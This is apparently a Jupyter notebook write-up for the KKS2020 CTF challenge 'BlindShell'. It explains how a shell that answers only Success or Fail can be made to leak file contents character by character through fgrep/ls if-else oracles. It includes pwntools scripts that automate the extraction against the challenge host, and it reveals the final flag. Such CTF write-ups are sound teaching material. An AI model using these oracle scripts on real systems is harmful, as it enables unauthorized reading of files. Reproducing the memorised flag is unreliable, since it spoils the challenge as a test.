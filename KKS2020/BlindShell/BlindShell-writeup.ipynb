{
 "cells": [
  {
   "attachments": {
    "image.png": {
     "image/png": "[encoded data removed]"
    }
   },
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![image.png](attachment:image.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Upon connecting with the server, the shell is awaiting input from the user. However, when we enter any commands, the shell does not return any output except for **Succcess!** or **Fail!** depending on the validity of the command.\n",
    "\n",
    "For example:\n",
    "```shell\n",
    "$ ls\n",
    "Success!\n",
    "$ l\n",
    "Failed!\n",
    "```\n",
    "\n",
    "At first, this does not seem very helpful but we can actually use this to find some information about the shell that we are running on. We can use the **find** command to check for files and `find flag.txt` returns Success. Great, now we already know that there is a file called **flag.txt**.\n",
    "\n",
    "Our next step is to read the file:\n",
    "\n",
    "Printing the flag will not bring us closer to the goal since it will only return Success. We can, however, check if a given substring -- say $a$ -- is in the flag. If the flag contains $a$, then we execute a valid command and the console will return Success. If the flag does not contain $a$, we need to fail such that the console returns Fail. \n",
    "\n",
    "We can do this using the **grep** command but we might run into some issues with regular expressions since we don't know if the flag contains any special regex characters like .,^\\$. To avoid any problems here, we can use **fgrep** interprets our substring without any special characters. We will use this method a couple of times for this challenge. \n",
    "\n",
    "Checking if our substring check works: We count the number of occurrences of the substring. If the flag.txt contains exactly one match, we will execute `echo \"T\"` but if it does not, we will execute the command `\"F\"` which will fail.\n",
    "```shell\n",
    "if fgrep -c \"a\" \"flag.txt\"; then echo \"T\"; else \"F\"; fi\n",
    "Success!\n",
    "if fgrep -c \"c\" \"flag.txt\"; then echo \"T\"; else \"F\"; fi\n",
    "Fail!\n",
    "```\n",
    "\n",
    "We can now expand our substring to the left and right until we found the whole content of flag.txt: "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pwn\n",
    "import string\n",
    "\n",
    "pwn.context.log_level = 'error'\n",
    "sh = pwn.remote('tasks.kksctf.ru', 30010)\n",
    "r = sh.recvuntil(\"$ \")\n",
    "\n",
    "alphabet = '_0123456789?,'+string.ascii_letters\n",
    "flag = ''\n",
    "while True:\n",
    "    #Find the first matching character of the flag and then build the rest of the flag (to the right)\n",
    "    for i in range(len(alphabet)):\n",
    "        msg = 'if fgrep -c \"{}\" \"flag.txt\"; then echo \"T\"; else \"F\"; fi'.format((flag+alphabet[i]))\n",
    "        sh.sendline(msg)\n",
    "        response = sh.recvuntil('$ ')\n",
    "        if \"Success!\" in response.decode():\n",
    "            flag += alphabet[i]\n",
    "            break\n",
    "\n",
    "    #If we have no match, we found the end of the flag. Now we need the start\n",
    "    for i in range(len(alphabet)):\n",
    "        msg = 'if fgrep -c \"{}\" \"flag.txt\"; then echo \"T\"; else \"Fail\"; fi'.format((alphabet[i]+flag))\n",
    "        sh.sendline(msg)\n",
    "        response1 = sh.recvuntil('$ ')\n",
    "        if \"Success!\" in response1.decode():\n",
    "            flag = alphabet[i] + flag\n",
    "            break\n",
    "    print(flag)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Eventually, we will find that the content of the flag.txt file is:\n",
    "\n",
    "```\n",
    "Look_around,maybe_here?\n",
    "```\n",
    "\n",
    "We can validate that there is nothing more in this file by counting the lines and the number of characters in the file:\n",
    "\n",
    "```shell\n",
    "if [[ `wc -l flag.txt | awk '{print $1}'` -eq 1 ]]; then echo \"True\"; else echo \"false\"; fi\n",
    "Success!\n",
    "if [[ `wc -m temp.txt | awk '{print $1}'` -eq 24 ]]; then echo \"True\"; else echo \"false\"; fi\n",
    "Success!\n",
    "```\n",
    "\n",
    "Unfortunately, the challenge is not over yet and \"Look_around,maybe_here?\" is not the flag. We will follow the instructions that the flag.txt file gave us and look around using our $if else$-pattern and the ls command to explore the other files in the folder.\n",
    "\n",
    "```shell\n",
    "if ls | fgrep -c 'm'; then echo 'T'; else ech; fi\n",
    "Success!\n",
    "```\n",
    "\n",
    "\n",
    "We can manually look for a substring which a substring of a folder and not \"flag.txt\". We will find the folder `maybehere` and also a file called `server.py` which we can ignore."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pwn\n",
    "import string\n",
    "\n",
    "pwn.context.log_level = 'error'\n",
    "sh = pwn.remote('tasks.kksctf.ru', 30010)\n",
    "r = sh.recvuntil(\"$ \")\n",
    "\n",
    "alphabet = '_0123456789?,'+string.ascii_letters\n",
    "folder = 'b'\n",
    "while True:\n",
    "    #Find the first matching character of the flag and then build the rest of the flag (to the right)\n",
    "    for i in range(len(alphabet)):\n",
    "        msg = \"if ls | fgrep -c '{}'; then echo 'T'; else ech; fi\".format(folder+alphabet[i])\n",
    "        sh.sendline(msg)\n",
    "        response = sh.recvuntil('$ ')\n",
    "        if \"Success!\" in response.decode():\n",
    "            folder += alphabet[i]\n",
    "            break\n",
    "\n",
    "    #If we have no match, we found the end of the flag. Now we need the start\n",
    "    for i in range(len(alphabet)):\n",
    "        msg = \"if ls | fgrep -c '{}'; then echo 'T'; else ech; fi\".format(alphabet[i] + folder)\n",
    "        sh.sendline(msg)\n",
    "        response1 = sh.recvuntil('$ ')\n",
    "        if \"Success!\" in response1.decode():\n",
    "            folder = alphabet[i] + folder\n",
    "            break\n",
    "    print(folder)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "With a slight modification of the ls command, we can find that the `maybehere` folder also contains a file called `flag.txt`:\n",
    "```shell\n",
    "if ls maybehere | fgrep -c 'm'; then echo 'T'; else ech; fi\n",
    "```\n",
    "\n",
    "If we now run our code with the correct path, we get the correct flag! However, at some point, we will be prompted with the message \n",
    "\n",
    "**You can solve this task with less symbols :)**\n",
    "\n",
    "To work around this, we will limit the number of characters that we send at a time:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1_\n",
      "11_s\n",
      "311_s2\n",
      "H311_s2c\n",
      "sH311_s2cK\n",
      "_sH311_s2cKs\n",
      "D_sH311_s2cKs_\n",
      "nD_sH311_s2cKs_b\n",
      "1nD_sH311_s2cKs_b4\n",
      "l1nD_sH311_s2cKs_b4t\n",
      "Bl1nD_sH311_s2cKs_b4t_\n",
      "Bl1nD_sH311_s2cKs_b4t_Y\n",
      "Bl1nD_sH311_s2cKs_b4t_Y0\n",
      "Bl1nD_sH311_s2cKs_b4t_Y0U\n",
      "Bl1nD_sH311_s2cKs_b4t_Y0U_\n",
      "Bl1nD_sH311_s2cKs_b4t_Y0U_a\n",
      "Bl1nD_sH311_s2cKs_b4t_Y0U_ar\n",
      "Bl1nD_sH311_s2cKs_b4t_Y0U_ar3\n",
      "Bl1nD_sH311_s2cKs_b4t_Y0U_ar3_\n"
     ]
    }
   ],
   "source": [
    "import pwn\n",
    "import string\n",
    "\n",
    "pwn.context.log_level = 'error'\n",
    "sh = pwn.remote('tasks.kksctf.ru', 30010)\n",
    "r = sh.recvuntil(\"$ \")\n",
    "\n",
    "alphabet = '_0123456789'+string.ascii_letters\n",
    "flag = ''\n",
    "while True:\n",
    "    #Find the first matching character of the flag and then build the rest of the flag (to the right)\n",
    "    for i in range(len(alphabet)):\n",
    "        msg = 'if fgrep -c \"{}\" \"maybehere/flag.txt\"; then echo \"T\"; else \"Fail\"; fi'.format((flag+alphabet[i])[-20:])\n",
    "        sh.sendline(msg)\n",
    "        response = sh.recvuntil('$ ')\n",
    "        if \"Success!\" in response.decode():\n",
    "            flag += alphabet[i]\n",
    "            break\n",
    "\n",
    "    #If we have no match, we found the end of the flag. Now we need the start\n",
    "    for i in range(len(alphabet)):\n",
    "        end = 20\n",
    "        msg = 'if fgrep -c \"{}\" \"maybehere/flag.txt\"; then echo \"T\"; else \"Fail\"; fi'.format((alphabet[i]+flag)[:20])\n",
    "        sh.sendline(msg)\n",
    "        response1 = sh.recvuntil('$ ')\n",
    "        if \"Success!\" in response1.decode():\n",
    "            flag = alphabet[i] + flag\n",
    "            break\n",
    "    print(flag)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Finally we get the correct flag:\n",
    "\n",
    "**Bl1nD_sH311_s2cKs_b4t_Y0U_ar3_amaz19g**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
